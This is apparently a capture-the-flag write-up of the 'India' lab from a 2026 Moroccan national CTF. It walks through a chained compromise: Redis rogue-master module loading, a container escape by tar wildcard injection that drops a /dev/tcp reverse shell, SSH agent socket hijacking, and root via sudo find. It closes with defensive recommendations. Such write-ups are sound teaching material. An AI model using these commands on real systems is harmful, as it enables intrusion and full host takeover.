# India Lab Writeup

## MACC 2026 National CTF Morocco

Presented by Team CyberDune Club and EST Guelmim, Ibn Zohr University

## Executive Summary

This lab chained together four weaknesses across two internal hosts:

- Redis remote code execution on `Delhi (10.8.0.101)`
- Container breakout via wildcard `tar` injection
- SSH agent hijacking to pivot from Delhi to `Mumbai (10.8.0.100)`
- Privilege escalation on Mumbai through `sudo` access to `find`

The final outcome was code execution on the Delhi host as `svcuser`, lateral movement to Mumbai as `admin`, and full `root` compromise on Mumbai.

## Scope

- Target 1: `Delhi - 10.8.0.101`
- Target 2: `Mumbai - 10.8.0.100`
- Objective: Compromise the lab and recover the final flag

## Attack Path Overview

1. Redis on Delhi exposed a remote code execution path through malicious module loading.
2. The Redis foothold landed inside a Docker container with write access to a host-mounted jobs directory.
3. A vulnerable host-side archival process used `tar` with a wildcard, enabling command execution on Delhi.
4. Access to an exposed SSH agent socket allowed pivoting to Mumbai as `admin`.
5. `sudo /usr/bin/find` provided an immediate GTFOBins path to `root` on Mumbai.

## Step 1: Initial Foothold on Delhi via Redis

The first entry point was an exposed Redis service on port `6379`. Instead of limiting the interaction to normal key-value operations, the service was coerced into loading a malicious shared object as a Redis module. This created an operating-system command execution primitive.

In practice, the attack used the rogue-master pattern:

- Make the victim Redis instance follow an attacker-controlled Redis server.
- Deliver a malicious module such as `exp.so` during synchronization.
- Load the module from disk.
- Invoke the new command exported by that module to execute system commands.

Representative command flow:

```text
SLAVEOF <attacker-ip> 6379
MODULE LOAD ./exp.so
system.exec "id"
```

This foothold did not directly provide host access. It exposed a shell inside a restricted Docker container running on Delhi.

## Step 2: Container Escape Through Wildcard Tar Injection

Inside the container, the critical observation was a writable volume mounted from the host:

```text
/opt/app/data/jobs
```

Files dropped into that directory were later processed by the host and moved into a compressed archive directory. The vulnerable behavior was consistent with a host-side command similar to:

```bash
cd /opt/app/data/jobs
tar -czf /opt/app/data/processed/backup.tar.gz *
```

Because the shell expands `*` before `tar` runs, filenames beginning with `--` are interpreted as command-line options. That made it possible to inject `tar` checkpoint directives and execute an attacker-controlled script on the host.

Payload preparation:

```bash
cd /opt/app/data/jobs
printf '%s\n' '#!/bin/bash' 'bash -i >& /dev/tcp/10.8.0.3/4444 0>&1' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=bash shell.sh'
```

When the host process archived the directory, `tar` interpreted the crafted filenames as runtime options and executed `shell.sh`. That converted the container foothold into code execution on the Delhi host as `svcuser`.

## Step 3: Lateral Movement from Delhi to Mumbai

From the Delhi host, local enumeration showed that the compromised account belonged to the `monitoring` group. That group had access to a live SSH agent socket:

```text
/run/ssh-agent/agent.sock
```

This enabled classic SSH agent hijacking. By pointing the current shell at the exposed socket, it was possible to borrow the private key identities loaded by another active session.

Relevant commands:

```bash
export SSH_AUTH_SOCK=/run/ssh-agent/agent.sock
ssh-add -l
ssh admin@10.8.0.100
```

The loaded key belonged to an administrative user, which allowed a clean pivot to Mumbai as `admin` without ever extracting a private key file from disk.

## Step 4: Privilege Escalation on Mumbai

Once on Mumbai, the next check was `sudo -l`. The result exposed a high-impact misconfiguration:

```text
(root) NOPASSWD: /usr/bin/find
```

This is a known GTFOBins privilege escalation path. Since `find` can execute arbitrary commands through `-exec`, it can be used to spawn a preserved-privilege shell as root.

Exploit:

```bash
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```

After spawning the privileged shell, the final validation steps were straightforward:

```bash
whoami
cat /root/root.txt
```

At this point, the Mumbai machine was fully compromised.

## Key Weaknesses Abused

- Redis exposed to the internal network with dangerous module-loading capability
- Writable host-mounted volume from an untrusted container
- Host automation invoking `tar` with an unsafe wildcard
- SSH agent socket permissions exposed to a non-admin group
- Overly permissive `sudo` rule for `/usr/bin/find`

## Defensive Recommendations

- Restrict Redis access, require authentication, and disable dangerous administrative functionality where possible.
- Avoid mounting sensitive host paths into containers that process untrusted input.
- Never call archival utilities on attacker-controlled filenames using raw wildcards.
- Limit SSH agent forwarding and lock down agent socket permissions.
- Replace broad `sudo` allowances with purpose-built wrappers or remove them entirely.

## Conclusion

The India lab is a strong example of chained exploitation rather than a single critical bug. A service-level foothold on Delhi became a container escape, which became a trust-boundary pivot to Mumbai, and finally a local privilege escalation to `root`. Each individual issue was serious, but the real impact came from how well the weaknesses composed into a full compromise path.
